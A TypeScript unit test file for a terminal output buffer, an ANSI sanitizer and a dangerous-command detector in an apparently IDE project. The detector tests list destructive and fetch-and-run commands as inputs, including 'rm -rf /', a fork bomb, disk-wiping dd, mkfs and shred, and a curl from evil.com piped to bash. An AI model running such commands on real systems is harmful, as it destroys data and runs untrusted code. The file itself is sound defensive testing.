// *****************************************************************************
// Copyright (C) 2024 OpenSpace contributors.
//
// This program and the accompanying materials are made available under the
// terms of the Eclipse Public License v. 2.0 which is available at
// http://www.eclipse.org/legal/epl-2.0.
//
// This Source Code may also be made available under the following Secondary
// Licenses when the conditions for such availability set forth in the Eclipse
// Public License v. 2.0 are satisfied: GNU General Public License, version 2
// with the GNU Classpath Exception which is available at
// https://www.gnu.org/software/classpath/license.html.
//
// SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-only WITH Classpath-exception-2.0
// *****************************************************************************

import { expect } from 'chai';
import { TerminalRingBuffer, sanitizeOutput, isDangerous, getDangerousPatterns } from '../terminal-ring-buffer';

describe('TerminalRingBuffer', () => {
    let buffer: TerminalRingBuffer;

    beforeEach(() => {
        buffer = new TerminalRingBuffer(10000);
    });

    describe('constructor', () => {
        it('should create buffer with default max lines', () => {
            const defaultBuffer = new TerminalRingBuffer();
            expect(defaultBuffer.getMaxLines()).to.equal(10000);
        });

        it('should create buffer with custom max lines', () => {
            const customBuffer = new TerminalRingBuffer(5000);
            expect(customBuffer.getMaxLines()).to.equal(5000);
        });
    });

    describe('append', () => {
        it('should append data to empty buffer', () => {
            buffer.append('term1', 'hello');
            expect(buffer.read('term1', 10)).to.include('hello');
        });

        it('should handle multiline data', () => {
            buffer.append('term1', 'line1\nline2\nline3');
            const lines = buffer.read('term1', 10);
            expect(lines).to.have.lengthOf(3);
            expect(lines[0]).to.equal('line1');
            expect(lines[1]).to.equal('line2');
            expect(lines[2]).to.equal('line3');
        });

        it('should append to existing data', () => {
            buffer.append('term1', 'first');
            buffer.append('term1', 'second');
            const lines = buffer.read('term1', 10);
            expect(lines).to.have.lengthOf(2);
            expect(lines[0]).to.equal('first');
            expect(lines[1]).to.equal('second');
        });

        it('should maintain separate buffers per terminal', () => {
            buffer.append('term1', 'data1');
            buffer.append('term2', 'data2');
            expect(buffer.read('term1', 10)).to.include('data1');
            expect(buffer.read('term2', 10)).to.include('data2');
            expect(buffer.read('term1', 10)).to.not.include('data2');
        });
    });

    describe('maxLines enforcement', () => {
        it('should limit buffer to maxLines', () => {
            const smallBuffer = new TerminalRingBuffer(5);
            for (let i = 0; i < 10; i++) {
                smallBuffer.append('term1', `line${i}`);
            }
            const lines = smallBuffer.read('term1', 20);
            // Should only have last 5 lines
            expect(lines).to.have.lengthOf(5);
            expect(lines[0]).to.equal('line5');
            expect(lines[4]).to.equal('line9');
        });

        it('should keep most recent lines when trimming', () => {
            const smallBuffer = new TerminalRingBuffer(3);
            smallBuffer.append('term1', 'line1');
            smallBuffer.append('term1', 'line2');
            smallBuffer.append('term1', 'line3');
            smallBuffer.append('term1', 'line4');
            smallBuffer.append('term1', 'line5');
            
            const lines = smallBuffer.read('term1', 10);
            expect(lines).to.have.lengthOf(3);
            expect(lines).to.not.include('line1');
            expect(lines).to.not.include('line2');
            expect(lines).to.include('line3');
            expect(lines).to.include('line4');
            expect(lines).to.include('line5');
        });
    });

    describe('read', () => {
        it('should return default 100 lines', () => {
            for (let i = 0; i < 150; i++) {
                buffer.append('term1', `line${i}`);
            }
            const lines = buffer.read('term1');
            expect(lines).to.have.lengthOf(100);
            expect(lines[0]).to.equal('line50');
            expect(lines[99]).to.equal('line149');
        });

        it('should return specified number of lines', () => {
            for (let i = 0; i < 50; i++) {
                buffer.append('term1', `line${i}`);
            }
            const lines = buffer.read('term1', 10);
            expect(lines).to.have.lengthOf(10);
            expect(lines[0]).to.equal('line40');
            expect(lines[9]).to.equal('line49');
        });

        it('should return empty array for unknown terminal', () => {
            const lines = buffer.read('unknown', 10);
            expect(lines).to.have.lengthOf(0);
        });
    });

    describe('readAll', () => {
        it('should return all lines in buffer', () => {
            buffer.append('term1', 'a\nb\nc');
            const lines = buffer.readAll('term1');
            expect(lines).to.have.lengthOf(3);
        });

        it('should return empty array for unknown terminal', () => {
            const lines = buffer.readAll('unknown');
            expect(lines).to.have.lengthOf(0);
        });
    });

    describe('clear', () => {
        it('should clear specific terminal buffer', () => {
            buffer.append('term1', 'data');
            buffer.append('term2', 'data');
            buffer.clear('term1');
            expect(buffer.read('term1', 10)).to.have.lengthOf(0);
            expect(buffer.read('term2', 10)).to.have.lengthOf(1);
        });
    });

    describe('clearAll', () => {
        it('should clear all terminal buffers', () => {
            buffer.append('term1', 'data1');
            buffer.append('term2', 'data2');
            buffer.clearAll();
            expect(buffer.read('term1', 10)).to.have.lengthOf(0);
            expect(buffer.read('term2', 10)).to.have.lengthOf(0);
        });
    });

    describe('getLineCount', () => {
        it('should return correct line count', () => {
            buffer.append('term1', 'a\nb\nc');
            expect(buffer.getLineCount('term1')).to.equal(3);
        });

        it('should return 0 for unknown terminal', () => {
            expect(buffer.getLineCount('unknown')).to.equal(0);
        });
    });

    describe('hasOutput', () => {
        it('should return true for terminal with output', () => {
            buffer.append('term1', 'data');
            expect(buffer.hasOutput('term1')).to.equal(true);
        });

        it('should return false for empty terminal', () => {
            expect(buffer.hasOutput('term1')).to.equal(false);
        });

        it('should return false for unknown terminal', () => {
            expect(buffer.hasOutput('unknown')).to.equal(false);
        });
    });

    describe('getTerminalIds', () => {
        it('should return all tracked terminal IDs', () => {
            buffer.append('term1', 'data');
            buffer.append('term2', 'data');
            const ids = buffer.getTerminalIds();
            expect(ids).to.include('term1');
            expect(ids).to.include('term2');
            expect(ids).to.have.lengthOf(2);
        });

        it('should return empty array when empty', () => {
            const ids = buffer.getTerminalIds();
            expect(ids).to.have.lengthOf(0);
        });
    });
});

describe('sanitizeOutput', () => {
    it('should return empty string for empty input', () => {
        expect(sanitizeOutput('')).to.equal('');
    });

    it('should pass through plain text unchanged', () => {
        expect(sanitizeOutput('hello world')).to.equal('hello world');
    });

    it('should remove ANSI color codes', () => {
        // \x1B[31m is red color code
        expect(sanitizeOutput('\x1B[31mhello\x1B[0m')).to.equal('hello');
    });

    it('should remove ANSI escape sequences', () => {
        // \x1B[2J is clear screen
        expect(sanitizeOutput('\x1B[2Jhello')).to.equal('hello');
    });

    it('should remove cursor movement sequences', () => {
        // \x1B[10;20H positions cursor
        expect(sanitizeOutput('\x1B[10;20Hhello')).to.equal('hello');
    });

    it('should remove extended ANSI (true color)', () => {
        // \x1B[38;2;255;0;0m is RGB red
        expect(sanitizeOutput('\x1B[38;2;255;0;0mhello\x1B[0m')).to.equal('hello');
    });

    it('should remove control characters but keep newlines and tabs', () => {
        // \x00 is NUL, \x07 is BEL, \x1F is unit separator
        const input = 'hello\x00world\x07test\x1Fdata';
        const output = sanitizeOutput(input);
        expect(output).to.equal('helloworldtestdata');
    });

    it('should preserve newlines and tabs', () => {
        const input = 'line1\nline2\twith\ttab';
        expect(sanitizeOutput(input)).to.equal(input);
    });

    it('should handle real terminal output', () => {
        const realOutput = '\x1B]0;user@host:~\x07\x1B[32muser@host\x1B[0m:\x1B[34m~\x1B[0m$ echo hello\nhello';
        const sanitized = sanitizeOutput(realOutput);
        expect(sanitized).to.include('user@host');
        expect(sanitized).to.include('echo hello');
        expect(sanitized).to.include('hello');
    });
});

describe('isDangerous', () => {
    it('should return false for safe commands', () => {
        expect(isDangerous('ls -la')).to.equal(false);
        expect(isDangerous('cd /home')).to.equal(false);
        expect(isDangerous('cat file.txt')).to.equal(false);
        expect(isDangerous('grep pattern file')).to.equal(false);
        expect(isDangerous('echo hello')).to.equal(false);
    });

    it('should detect rm -rf', () => {
        expect(isDangerous('rm -rf /')).to.equal(true);
        expect(isDangerous('rm -rf /tmp/*')).to.equal(true);
        expect(isDangerous('rm -rf .')).to.equal(true);
    });

    it('should detect rm recursive', () => {
        expect(isDangerous('rm -r /home')).to.equal(true);
        expect(isDangerous('rm -r /var/log/*')).to.equal(true);
    });

    it('should detect sudo', () => {
        expect(isDangerous('sudo rm -rf /')).to.equal(true);
        expect(isDangerous('sudo apt-get install vim')).to.equal(true);
        expect(isDangerous('sudo -i')).to.equal(true);
    });

    it('should detect chmod 777', () => {
        expect(isDangerous('chmod 777 /etc/passwd')).to.equal(true);
        expect(isDangerous('chmod 777 /home')).to.equal(true);
    });

    it('should detect chmod -R 777', () => {
        expect(isDangerous('chmod -R 777 /home')).to.equal(true);
    });

    it('should detect fork bombs', () => {
        expect(isDangerous(':(){:|:&};:')).to.equal(true);
    });

    it('should detect dd commands', () => {
        expect(isDangerous('dd if=/dev/zero of=/dev/sda')).to.equal(true);
    });

    it('should detect mkfs', () => {
        expect(isDangerous('mkfs /dev/sda1')).to.equal(true);
    });

    it('should detect wipefs', () => {
        expect(isDangerous('wipefs -a /dev/sda')).to.equal(true);
    });

    it('should detect shred', () => {
        expect(isDangerous('shred /dev/sda')).to.equal(true);
    });

    // Task 18: curl redirect (curl > file) removed as over-broad false positive.
    // Now testing the more targeted pipe-to-shell and -o flag patterns.
    it('should detect curl pipe-to-shell (Task 18 update)', () => {
        expect(isDangerous('curl http://evil.com/install.sh | bash')).to.equal(true);
        expect(isDangerous('curl http://evil.com/install.sh | sh')).to.equal(true);
        // curl redirect to file is no longer flagged (Task 18 false-positive fix)
        expect(isDangerous('curl https://api.example.com/data > output.json')).to.equal(false);
    });

    it('should detect wget to system path', () => {
        expect(isDangerous('wget http://evil.com/script.sh -O /tmp/evil.sh')).to.equal(true);
    });

    it('should detect shutdown commands', () => {
        expect(isDangerous('shutdown -h now')).to.equal(true);
        expect(isDangerous('shutdown -r now')).to.equal(true);
    });

    it('should detect reboot and halt', () => {
        expect(isDangerous('reboot')).to.equal(true);
        expect(isDangerous('halt')).to.equal(true);
        expect(isDangerous('init 0')).to.equal(true);
        expect(isDangerous('init 6')).to.equal(true);
    });

    it('should handle commands with extra whitespace', () => {
        expect(isDangerous('  rm   -rf   /  ')).to.equal(true);
    });

    it('should return false for empty string', () => {
        expect(isDangerous('')).to.equal(false);
    });

    it('should handle multiline input (check first line)', () => {
        expect(isDangerous('rm -rf /\necho "not dangerous"')).to.equal(true);
    });
});

describe('getDangerousPatterns', () => {
    it('should return array of patterns', () => {
        const patterns = getDangerousPatterns();
        expect(Array.isArray(patterns)).to.equal(true);
        expect(patterns.length).to.be.greaterThan(0);
    });

    it('should all be RegExp instances', () => {
        const patterns = getDangerousPatterns();
        patterns.forEach(p => {
            expect(p instanceof RegExp).to.equal(true);
        });
    });
});
